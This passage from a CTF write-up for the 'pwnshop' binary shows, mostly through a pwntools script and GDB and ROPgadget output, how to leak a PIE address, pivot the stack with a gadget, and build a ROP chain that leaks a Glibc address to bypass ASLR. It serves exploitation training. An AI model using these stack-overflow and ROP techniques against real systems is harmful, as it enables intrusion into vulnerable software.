<span class="code-dark-blue">0x7fffffffe690</span>: 0x00007ffff7ffc620      0x00007fffffffe778
<span class="code-dark-blue">0x7fffffffe6a0</span>: 0x0000000100000000      0x00005555555550a0
<span class="code-dark-blue">0x7fffffffe6b0</span>: 0x0000555555555360      0x4f8b73ff7c1dbc64
</code></pre></div><h3 id="pie-bypass">PIE bypass</h3><p>Notice that <code>0x00005555555580c0</code> is an address of the binary (actually, the address of <code>details_global</code>). Also, <code>price</code> will be 8 bytes before that address. Therefore, if we enter exactly 8 bytes, the program will print out the price and the address will be leaked because strings in C end in a null byte, and there is no null byte there:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>ni
AAAAAAAA
<span class="code-dark-blue">0x00007ffff7ecafd2</span>      26      in <span class="code-dark-green">../sysdeps/unix/sysv/linux/read.c</span>  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>x/20gx 0x7fffffffe620
<span class="code-dark-blue">0x7fffffffe620</span>: 0x0000000a66647361      0x0000000000000000  
<span class="code-dark-blue">0x7fffffffe630</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x7fffffffe640</span>: 0x4141414141414141      0x00005555555580c0
<span class="code-dark-blue">0x7fffffffe650</span>: 0x0000000000000032      0x0000000000000032
<span class="code-dark-blue">0x7fffffffe660</span>: 0x0000555555556123      0x00005555555550fe
<span class="code-dark-blue">0x7fffffffe670</span>: 0x0000555555555360      0x0000555555555360
<span class="code-dark-blue">0x7fffffffe680</span>: 0x0000000000000000      0x00007ffff7de1083
<span class="code-dark-blue">0x7fffffffe690</span>: 0x00007ffff7ffc620      0x00007fffffffe778
<span class="code-dark-blue">0x7fffffffe6a0</span>: 0x0000000100000000      0x00005555555550a0
<span class="code-dark-blue">0x7fffffffe6b0</span>: 0x0000555555555360      0xc4df5b54e114ad2c
<span class="code-green">gef➤  </span>continue
Continuing.
What? AAAAAAAAUUUU? The best I can do is 13.37$
What do you wanna do?
1&gt; Buy
2&gt; Sell
3&gt; Exit
&gt;
</code></pre></div><p>Let&rsquo;s start with this Python script to catch this memory leak:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/usr/bin/env python3</span>

<span class="mtk5">from</span><span class="mtk1"> </span><span class="mtk8 mtku">pwn</span><span class="mtk1"> </span><span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk5">*</span>

context.binary <span class="mtk5">=</span> <span class="mtk4">'pwnshop'</span>


<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">get_process</span><span class="mtk1">():</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">argv</span><span class="mtk1">) </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">:</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span>context.binary<span class="mtk1">.</span><span class="mtk8">process</span><span class="mtk1">()</span>

<span class="mtk1">    </span><span class="mtk1">host</span><span class="mtk1">, </span><span class="mtk1">port</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">argv</span><span class="mtk1">[</span><span class="mtk6">1</span><span class="mtk1">].</span><span class="mtk8">split</span><span class="mtk1">(</span><span class="mtk4">':'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8 mtku">remote</span><span class="mtk1">(</span><span class="mtk1">host</span><span class="mtk1">, </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">port</span><span class="mtk1">))</span>


<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">():</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">get_process</span><span class="mtk1">()</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'2'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'What do you wish to sell? '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'asdf'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'How much do you want for it? '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">8</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvuntil</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'? '</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">details_global_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> u64(</span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvuntil</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'?'</span><span class="mtk1">)[</span><span class="mtk6">8</span><span class="mtk1">:</span><span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">].</span><span class="mtk8">ljust</span><span class="mtk1">(</span><span class="mtk6">8</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">))</span>  
<span class="mtk1">    </span><span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">info</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Leaked an ELF address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">details_global_addr</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>


<span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">__name__</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">'__main__'</span><span class="mtk1">:</span>
<span class="mtk1">    </span><span class="mtk8">main</span><span class="mtk1">()</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-blue">*</span>] './pwnshop'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-red">No canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
[<span class="code-green">+</span>] Starting local process './pwnshop': pid 1152256  
[<span class="code-blue">*</span>] Leaked an ELF address: 0x55b344cf90c0
[<span class="code-blue">*</span>] Switching to interactive mode
 The best I can do is 13.37$
What do you wanna do?
1&gt; Buy
2&gt; Sell
3&gt; Exit
&gt; <span class="code-red">$</span>
</code></pre></div><p>Alright, now we can return to GDB and find the offset to the base address of the binary:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>vmmap
[ Legend:  <span class="code-dark-red">Code</span> | <span class="code-dark-green">Heap</span> | <span class="code-dark-magenta">Stack</span> ]
<span class="code-dark-blue">Start              End                Offset             Perm Path</span>
0x00555555554000 0x00555555555000 0x00000000000000 r-- ./pwnshop
<span class="code-dark-red">0x00555555555000</span> <span class="code-dark-red">0x00555555556000</span> <span class="code-dark-red">0x00000000001000</span> <span class="code-dark-red">r-x</span> <span class="code-dark-red">./pwnshop</span>
0x00555555556000 0x00555555557000 0x00000000002000 r-- ./pwnshop
0x00555555557000 0x00555555558000 0x00000000002000 r-- ./pwnshop
0x00555555558000 0x00555555559000 0x00000000003000 rw- ./pwnshop
0x007ffff7dbd000 0x007ffff7ddf000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so  
<span class="code-dark-red">0x007ffff7ddf000</span> <span class="code-dark-red">0x007ffff7f57000</span> <span class="code-dark-red">0x00000000022000</span> <span class="code-dark-red">r-x</span> <span class="code-dark-red">/usr/lib/x86_64-linux-gnu/libc-2.31.so</span>
0x007ffff7f57000 0x007ffff7fa5000 0x0000000019a000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x007ffff7fa5000 0x007ffff7fa9000 0x000000001e7000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x007ffff7fa9000 0x007ffff7fab000 0x000000001eb000 rw- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x007ffff7fab000 0x007ffff7fb1000 0x00000000000000 rw-
0x007ffff7fc9000 0x007ffff7fcd000 0x00000000000000 r-- [vvar]
<span class="code-dark-red">0x007ffff7fcd000</span> <span class="code-dark-red">0x007ffff7fcf000</span> <span class="code-dark-red">0x00000000000000</span> <span class="code-dark-red">r-x</span> <span class="code-dark-red">[vdso]</span>
0x007ffff7fcf000 0x007ffff7fd0000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so
<span class="code-dark-red">0x007ffff7fd0000</span> <span class="code-dark-red">0x007ffff7ff3000</span> <span class="code-dark-red">0x00000000001000</span> <span class="code-dark-red">r-x</span> <span class="code-dark-red">/usr/lib/x86_64-linux-gnu/ld-2.31.so</span>
0x007ffff7ff3000 0x007ffff7ffb000 0x00000000024000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x007ffff7ffc000 0x007ffff7ffd000 0x0000000002c000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x007ffff7ffd000 0x007ffff7ffe000 0x0000000002d000 rw- /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x007ffff7ffe000 0x007ffff7fff000 0x00000000000000 rw-
<span class="code-dark-magenta">0x007ffffffde000</span> <span class="code-dark-magenta">0x007ffffffff000</span> <span class="code-dark-magenta">0x00000000000000</span> <span class="code-dark-magenta">rw-</span> <span class="code-dark-magenta">[stack]</span>
0xffffffffff600000 0xffffffffff601000 0x00000000000000 --x [vsyscall]
<span class="code-green">gef➤  </span>p/x 0x00005555555580c0 - 0x00555555554000
$1 = 0x40c0
</code></pre></div><p>So, using these lines we have the base address:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span>elf_addr<span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">details_global_addr</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">40c0</span>
<span class="mtk1">    </span><span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'ELF base address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span>elf_addr<span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-blue">*</span>] './pwnshop'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-red">No canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
[<span class="code-green">+</span>] Starting local process './pwnshop': pid 1155249  
[<span class="code-blue">*</span>] Leaked an ELF address: 0x55e1931b10c0
[<span class="code-green">+</span>] ELF base address: 0x55e1931ad000
[<span class="code-blue">*</span>] Switching to interactive mode
 The best I can do is 13.37$
What do you wanna do?
1&gt; Buy
2&gt; Sell
3&gt; Exit
&gt; <span class="code-red">$</span>
</code></pre></div><p>As a sanity check, we can verify that the base address ends in <code>000</code> in hexadecimal.</p><h3 id="crafting-the-rop-chain">Crafting the ROP chain</h3><p>At this point, we can continue by using a ROP chain to leak an address of Glibc (as explained before).</p><p>Although we can overwrite the return address and redirect program execution, we don&rsquo;t have enough space to enter the ROP chain in the stack. However, we can try to modify the <code>$rsp</code> register to get more space. These are the involved gadgets:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ROPgadget</span> --binary <span class="mtku">pwnshop</span> | <span class="code-dark-green">grep</span> rsp
0x0000000000001323 : add <span class="code-red">rsp</span>, 0x38 ; pop rbx ; pop rbp ; ret
0x0000000000001357 : add <span class="code-red">rsp</span>, 0x48 ; ret
0x0000000000001016 : add <span class="code-red">rsp</span>, 8 ; ret
0x00000000000013db : cli ; sub <span class="code-red">rsp</span>, 8 ; add <span class="code-red">rsp</span>, 8 ; ret
0x00000000000013bd : pop <span class="code-red">rsp</span> ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000001011 : sal byte ptr [rdx + rax - 1], 0xd0 ; add <span class="code-red">rsp</span>, 8 ; ret  
0x00000000000013dd : sub esp, 8 ; add <span class="code-red">rsp</span>, 8 ; ret
0x0000000000001219 : sub <span class="code-red">rsp</span>, 0x28 ; ret
0x00000000000013dc : sub <span class="code-red">rsp</span>, 8 ; add <span class="code-red">rsp</span>, 8 ; ret
</code></pre></div><p>There is no easy way of pivoting the stack, but this is a strange gadget: <code>sub rsp, 0x28; ret</code>. Actually, we control <code>0x50</code> bytes of the stack. In order to find where to enter the addresses, let&rsquo;s use recognizable values and attach GDB:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">():</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">get_process</span><span class="mtk1">()</span>
<span class="mtk1">    </span><span class="mtk8 mtku">gdb</span><span class="mtk1">.</span><span class="mtk8">attach</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk4">'continue'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'2'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'What do you wish to sell? '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'asdf'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'How much do you want for it? '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">8</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvuntil</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'? '</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">details_global_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> u64(</span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvuntil</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'?'</span><span class="mtk1">)[</span><span class="mtk6">8</span><span class="mtk1">:</span><span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">].</span><span class="mtk8">ljust</span><span class="mtk1">(</span><span class="mtk6">8</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">))</span>
<span class="mtk1">    </span><span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">info</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Leaked details_global address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">details_global_addr</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>  

<span class="mtk1">    </span><span class="mtk1">elf_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">details_global_addr</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">40c0</span>
<span class="mtk1">    </span><span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'ELF base address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">elf_addr</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">sub_rsp_0x28_ret</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">elf_addr</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">1219</span>

<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">''</span>
<span class="mtk1">    </span><span class="mtk1">c</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">ord</span><span class="mtk1">(</span><span class="mtk4">'A'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk5">while</span><span class="mtk1"> </span><span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk1">payload</span><span class="mtk1">) </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk6">72</span><span class="mtk1">:</span>
<span class="mtk1">        </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk8 mtku">bytes</span><span class="mtk1">([</span><span class="mtk1">c</span><span class="mtk1">] </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">8</span><span class="mtk1">)</span>
<span class="mtk1">        </span><span class="mtk1">c</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk6">1</span>

<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">sub_rsp_0x28_ret</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'1'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Enter details: '</span><span class="mtk1">, </span><span class="mtk1">payload</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-blue">*</span>] './pwnshop'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-red">No canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
[<span class="code-green">+</span>] Starting local process './pwnshop': pid 1210228
[<span class="code-blue">*</span>] running in new terminal: ['/usr/bin/gdb', '-q', './pwnshop', '1210228', '-x', '/tmp/pwneb4m3_hv.gdb']  
[<span class="code-green">+</span>] Waiting for debugger: Done
[<span class="code-blue">*</span>] Leaked details_global address: 0x5556e442a0c0
[<span class="code-green">+</span>] ELF base address: 0x5556e4426000
[<span class="code-blue">*</span>] Switching to interactive mode
<span class="code-red">$</span>
</code></pre></div><p>The program crashes, but this is the stack at this point:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>x/8gx $rsp
<span class="code-dark-blue">0x7fffa5ba1548</span>: 0x4646464646464646      0x4747474747474747  
<span class="code-dark-blue">0x7fffa5ba1558</span>: 0x4848484848484848      0x4949494949494949
<span class="code-dark-blue">0x7fffa5ba1568</span>: 0x00005556e4427219      0x00005556e4427360
<span class="code-dark-blue">0x7fffa5ba1578</span>: 0x00005556e4427360      0x0000000000000000
</code></pre></div><p>Therefore, we have 4 slots to enter ROP gadgets. Let&rsquo;s craft ROP chain to leak an address of Glibc using the GOT and the PLT (as usually). These are the necessary offsets:</p><ul><li>Offset of <code>pop rdi; ret</code> gadget (<code>0x13c3</code>):</li></ul><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ROPgadget</span> --binary <span class="mtku">pwnshop</span> | <span class="code-dark-green">grep</span> <span class="code-dark-yellow">'pop rdi'</span>  
0x00000000000013c3 : <span class="code-red">pop rdi</span> ; ret
</code></pre></div><ul><li>Offset of <code>setvbuf</code> at the GOT (<code>0x4038</code>):</li></ul><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">objdump</span> -M intel -R <span class="mtku">pwnshop</span> | <span class="code-dark-green">grep</span> setvbuf
0000000000004048 R_X86_64_JUMP_SLOT  <span class="code-red">setvbuf</span>@GLIBC_2.2.5  
</code></pre></div><ul><li>Offset of <code>puts</code> at the PLT (<code>0x1030</code>):</li></ul><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">objdump</span> -M intel -d <span class="mtku">pwnshop</span> | <span class="code-dark-green">grep</span> <span class="code-dark-yellow">'&lt;puts@plt&gt;:'</span>  
0000000000001030 <span class="code-red">&lt;puts@plt&gt;:</span>
</code></pre></div><ul><li>Recall that <code>buy</code> is at offset <code>0x132a</code></li></ul><h3 id="leaking-memory-addresses">Leaking memory addresses</h3><p>So we have this payload:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk1">sub_rsp_0x28_ret</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">elf_addr</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">1219</span>
<span class="mtk1">    </span><span class="mtk1">pop_rdi_ret</span><span class="mtk1">      </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">elf_addr</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">13c3</span>

<span class="mtk1">    </span><span class="mtk1">setvbuf_got_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">elf_addr</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">4048</span>
<span class="mtk1">    </span><span class="mtk1">puts_plt_addr</span><span class="mtk1">    </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">elf_addr</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">1030</span>
<span class="mtk1">    </span><span class="mtk1">buy_addr</span><span class="mtk1">         </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">elf_addr</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">132a</span>

<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1">  </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">8</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">5</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">pop_rdi_ret</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">setvbuf_got_addr</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">puts_plt_addr</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">buy_addr</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">sub_rsp_0x28_ret</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'1'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Enter details: '</span><span class="mtk1">, </span><span class="mtk1">payload</span><span class="mtk1">)</span>  

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-blue">*</span>] './pwnshop'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-red">No canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
[<span class="code-green">+</span>] Starting local process './pwnshop': pid 1287589  
[<span class="code-blue">*</span>] Leaked details_global address: 0x56069695a0c0
[<span class="code-green">+</span>] ELF base address: 0x560696956000
[<span class="code-blue">*</span>] Switching to interactive mode
\xe0&lt;\xc7̛\x7f
Sorry, we aren't selling right now.
But you can place a request.
Enter details: <span class="code-red">$</span>
</code></pre></div><p>And there we have the leak. Let&rsquo;s catch it and find the base address of Glibc to bypass ASLR:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ldd</span> <span class="mtku">pwnshop</span>
        linux-vdso.so.1 (0x00007ffe2cd77000)
        libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f1fdc075000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f1fdc281000)

